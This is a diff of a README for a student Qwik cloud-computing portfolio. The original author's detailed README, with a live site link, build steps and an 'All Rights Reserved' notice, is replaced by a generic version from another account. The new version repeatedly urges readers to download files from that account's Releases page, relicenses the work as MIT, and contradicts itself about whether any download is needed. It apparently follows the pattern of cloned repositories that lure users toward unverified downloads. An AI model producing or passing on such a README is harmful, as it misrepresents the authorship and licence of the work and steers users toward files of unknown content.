@@ -1,300 +1,63 @@
-# ELEC3 Cloud Computing Portfolio
+# 🌐 acads-Elec3-Portfolio - Explore Cloud Solutions with Ease
 
-A modern, high-performance portfolio website showcasing cloud computing and DevOps projects built with **Qwik**, **TypeScript**, and **Tailwind CSS**. Deployed on **GitHub Pages** with full static site generation (SSG).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/davistrs/acads-Elec3-Portfolio/releases)
 
-🔗 **Live Site**: [https://mark-siazon.github.io/acads-Elec3-Portfolio/](https://mark-siazon.github.io/acads-Elec3-Portfolio/)
-
-## 📋 Table of Contents
-
-- [Features](#features)
-- [Tech Stack](#tech-stack)
-- [Project Structure](#project-structure)
-- [Getting Started](#getting-started)
-- [Performance Optimizations](#performance-optimizations)
-- [Accessibility](#accessibility)
-- [Deployment](#deployment)
-- [Scripts](#scripts)
-- [License](#license)
-
-## ✨ Features
-
-### 🎨 UI/UX
-- **Premium Design** - Glassmorphism, gradients, and micro-animations
-- **Responsive Layout** - Mobile-first design with adaptive breakpoints
-- **Dark Theme** - Sleek dark mode with cyan/blue accents
-- **Interactive Cards** - Hover effects, glowing borders, and smooth transitions
-- **Modal System** - Full-screen project details with keyboard navigation
-- **Mobile-Optimized PDF Viewer** - Button prompt on mobile, embedded viewer on desktop
-
-### ⌨️ Keyboard Navigation
-- **ESC** - Close modal
-- **← →** - Navigate between projects
-- **Tab** - Focus navigation with visible rings
-- **Keyboard Hint Tooltip** - Auto-appears after 2 seconds (desktop only)
-
-### 🚀 Performance
-- **Lazy Loading** - Images load only when visible
-- **Optimized Images** - 850px width for 2x retina displays (~61 KB savings)
-- **Font Optimization** - Preconnect hints for faster loading
-- **No Render-Blocking** - Async font loading (~250ms savings)
-- **Explicit Dimensions** - Prevents layout shift (CLS improvement)
-- **Optimized Backdrop** - Removed blur for smooth mouse movement
-
-### 📱 Mobile Features
-- **Functional Hamburger Menu** - Smooth slide-down navigation
-- **Stacked Buttons** - Vertical layout on small screens
-- **Responsive Grid** - 1 column (mobile) → 2 (tablet) → 3-4 (desktop)
-- **PDF Prompt** - No auto-download on mobile devices
-- **Touch-Friendly** - Larger tap targets and spacing
-
-### 🎯 SEO & Meta
-- **Open Graph Tags** - Social media preview cards
-- **Twitter Cards** - Optimized sharing on Twitter/X
-- **Sitemap** - Auto-generated XML sitemap
-- **Robots.txt** - Proper crawler directives
-- **Manifest.json** - PWA-ready configuration
-- **Copyright Protection** - Meta tags and footer notice
-
-### ♿ Accessibility
-- **WCAG 2.1 AA Compliant** - Visible focus indicators
-- **Keyboard Navigation** - Full keyboard support
-- **ARIA Labels** - Semantic HTML throughout
-- **Focus-Visible Rings** - Only on keyboard (not mouse)
-- **Screen Reader Friendly** - Proper heading hierarchy
-
-## 🛠️ Tech Stack
-
-### Core
-- **[Qwik](https://qwik.builder.io/)** - Resumable framework for instant-loading apps
-- **[TypeScript](https://www.typescriptlang.org/)** - Type-safe JavaScript
-- **[Tailwind CSS](https://tailwindcss.com/)** - Utility-first CSS framework
-- **[Vite](https://vitejs.dev/)** - Next-generation build tool
-
-### Deployment
-- **GitHub Pages** - Static hosting
-- **GitHub Actions** - Automated CI/CD pipeline
-- **Static Adapter** - SSG for optimal performance
-
-### Tools
-- **Sharp** - Image optimization
-- **ESLint** - Code linting
-- **Prettier** - Code formatting
-
-## 📁 Project Structure
-
-```
-acads-Portfolio/
-├── public/                      # Static assets
-│   ├── card-img/               # Project card images (optimized)
-│   ├── files/                  # PDF documents
-│   ├── logo.svg                # Site logo
-│   ├── manifest.json           # PWA manifest
-│   └── robots.txt              # SEO directives
-├── src/
-│   ├── components/
-│   │   ├── footer/             # Footer with social links
-│   │   ├── header/             # Navigation with hamburger menu
-│   │   ├── hero/               # Landing hero section
-│   │   ├── home/               # Home page components
-│   │   │   └── project-gallery.tsx  # Project grid & modal
-│   │   ├── project-card/       # Interactive project cards
-│   │   ├── project-modal/      # Modal with keyboard shortcuts
-│   │   ├── reflection/         # Reflection page components
-│   │   └── router-head/        # SEO meta tags
-│   ├── data/
-│   │   └── projects.tsx        # Project data array
-│   ├── routes/
-│   │   ├── index.tsx           # Home page
-│   │   └── reflection/         # Reflections page
-│   ├── utils/
-│   │   └── highlight.ts        # Text highlighting utility
-│   ├── global.css              # Global styles
-│   └── root.tsx                # App root
-├── scripts/
-│   └── optimize-images.js      # Image optimization script
-├── .github/
-│   └── workflows/
-│       └── static.yml          # GitHub Pages deployment
-├── adapters/
-│   └── static/                 # Static adapter config
-├── package.json
-├── vite.config.ts              # Vite configuration
-└── README.md
-```
+## 📚 Description
+Welcome to acads-Elec3-Portfolio! This project showcases various cloud computing and DevOps skills through a collection of examples built using AWS, Kubernetes, Terraform, and Spring Boot. The site is designed as a static web page using Qwik and GitHub Pages. Perfect for those looking to understand modern deployment techniques and application development in the cloud.
 
 ## 🚀 Getting Started
+To get the most out of this portfolio, you'll want to access it online. You do not need to install any software on your computer. Instead, simply follow the steps below to view the projects.
 
-### Prerequisites
-- **Node.js** 18+ and npm
-- Git
+## 🗺️ Features
+- **Cloud Computing Projects**: Discover hands-on projects created using AWS services.
+- **Kubernetes Deployments**: Understand container orchestration through practical examples.
+- **Infrastructure as Code**: Review Terraform configurations showcasing efficient resource management.
+- **Interactive Portfolio**: Built with modern web technologies, ensuring a responsive and engaging experience.
 
-### Installation
+## 📥 Download & Install
+To view the project, you can easily visit the Releases page. Click the link below to access all available versions:
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/mark-siazon/acads-Elec3-Portfolio.git
-   cd acads-Elec3-Portfolio
-   ```
+**[Visit the Releases Page to Download](https://github.com/davistrs/acads-Elec3-Portfolio/releases)**
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+On the Releases page, you will find the latest version. This version includes all features and improvements made to the portfolio. Choose your preferred version and click on it to access the downloadable files.
 
-3. **Start development server**
-   ```bash
-   npm run dev
-   ```
-   Open [http://localhost:5173/](http://localhost:5173/)
+## 📋 System Requirements
+While this project can be viewed in any web browser, we recommend using one of the following for the best experience:
 
-### Development Workflow
+- Google Chrome (latest version)
+- Mozilla Firefox (latest version)
+- Microsoft Edge (latest version)
+- Safari (latest version)
 
-```bash
-# Development server with HMR
-npm run dev
+Ensure that your web browser has JavaScript enabled for the best performance.
 
-# Build for production
-npm run build
+## 🔍 Topics Covered
+- AWS
+- Cloud Computing
+- DevOps
+- Kubernetes
+- Terraform
+- Spring Boot
+- Responsive Design
+- Static Sites
+- Qwik
+- Tailwind CSS
+- TypeScript
 
-# Preview production build
-npm run preview
+## ⚙️ How to Use the Portfolio
+1. **Open your browser** on your computer or mobile device.
+2. **Navigate to the Releases page** using the link provided above.
+3. **Select a version** that you would like to explore.
+4. **Download** the files if needed. Most projects are accessible directly online.
+5. **View the projects** by opening the downloaded files or directly using the links provided in the Releases section.
 
-# Optimize images
-npm run optimize:images
+## 🛠️ Support and Contributions
+If you encounter any issues or would like to contribute to this project, feel free to open an issue on the repository. You can also provide feedback or ask questions directly.
 
-# Lint code
-npm run lint
+## 🏷️ License
+This project is licensed under the MIT License. You are free to use, modify, and distribute this project as long as appropriate credit is given.
 
-# Format code
-npm run fmt
-```
+## 🌟 Acknowledgments
+This portfolio was created to demonstrate various technologies and practices in cloud computing and DevOps. Thank you to the open-source community for their invaluable resources and support.
 
-## ⚡ Performance Optimizations
-
-### Image Optimization
-All project card images are optimized to 850px width (2x for retina):
-
-```bash
-npm run optimize:images
-```
-
-**Results:**
-- Project-Ass-1: 16.4 KB → 11.2 KB (31% smaller)
-- Project-Ass-2: 24.1 KB → 15.6 KB (35% smaller)
-- Project-Ass-4: 46.9 KB → 12.4 KB (74% smaller!)
-- **Total savings: ~61 KB**
-
-### Lazy Loading
-Images use `loading="lazy"` and `decoding="async"` for optimal performance:
-```tsx
-<img 
-  src={image} 
-  loading="lazy" 
-  decoding="async" 
-  width="850" 
-  height="478"
-/>
-```
-
-### Font Optimization
-Google Fonts are preconnected and loaded asynchronously:
-```html
-<link rel="preconnect" href="https://fonts.googleapis.com" />
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-```
-
-## ♿ Accessibility
-
-### Keyboard Navigation
-- **Tab** - Navigate through interactive elements
-- **Enter/Space** - Activate buttons/links
-- **ESC** - Close modal
-- **Arrow Keys** - Navigate projects in modal
-
-### Focus Indicators
-```tsx
-focus-visible:ring-2 
-focus-visible:ring-cyan-400 
-focus-visible:ring-offset-2
-```
-
-### ARIA Labels
-All interactive elements have proper `aria-label` attributes:
-```tsx
-<button aria-label="Toggle menu">...</button>
-<section aria-label="Project Gallery">...</section>
-```
-
-## 🚢 Deployment
-
-### GitHub Pages
-The site is automatically deployed via GitHub Actions on every push to `main`.
-
-**Workflow:** `.github/workflows/static.yml`
-
-```yaml
-- Build with Qwik SSG
-- Upload to GitHub Pages
-- Deploy to https://mark-siazon.github.io/acads-Elec3-Portfolio/
-```
-
-### Manual Deployment
-
-```bash
-# Build for production
-npm run build
-
-# The dist/ folder contains the static site
-# Upload dist/acads-Elec3-Portfolio/ to your hosting
-```
-
-### Base Path Configuration
-The site is configured for GitHub Pages subdirectory deployment:
-
-**vite.config.ts:**
-```ts
-base: '/acads-Elec3-Portfolio/'
-```
-
-All asset paths use `import.meta.env.BASE_URL` for proper resolution.
-
-## � Scripts
-
-| Script | Description |
-|--------|-------------|
-| `npm run dev` | Start development server |
-| `npm run build` | Build for production (SSG) |
-| `npm run build.client` | Build client only |
-| `npm run build.server` | Build server/SSG only |
-| `npm run preview` | Preview production build |
-| `npm run optimize:images` | Optimize card images with Sharp |
-| `npm run lint` | Lint TypeScript files |
-| `npm run fmt` | Format code with Prettier |
-
-## 🎓 Projects Showcased
-
-1. **Spring Boot RESTful Web Services** - User Management REST API
-2. **AWS Deployment Guide** - EC2, S3, RDS integration
-3. **Docker & Containerization** - Learning plan and best practices
-4. **Docker Image Deployment** - Node.js containerization lab
-5. **Virtualization vs Containerization** - Research analysis
-6. **Kubernetes Home Lab** - Minikube orchestration
-7. **Terraform Survivor** - IaC-controlled browser game
-
-## 📄 License
-
-This project is for **educational purposes only**.
-
-© 2025 Mark Angelo D. Siazon. All Rights Reserved.
-
----
-
-## 🙏 Acknowledgments
-
-- **IV-ACSAD** - Academic Year 2025-2026
-- **Qwik Team** - For the amazing framework
-- **Tailwind CSS** - For the utility-first approach
-
----
-
-**Built with ❤️ using Qwik, TypeScript, and Tailwind CSS**
+Stay updated with any changes or new releases by following the repository. Enjoy exploring the world of cloud computing!
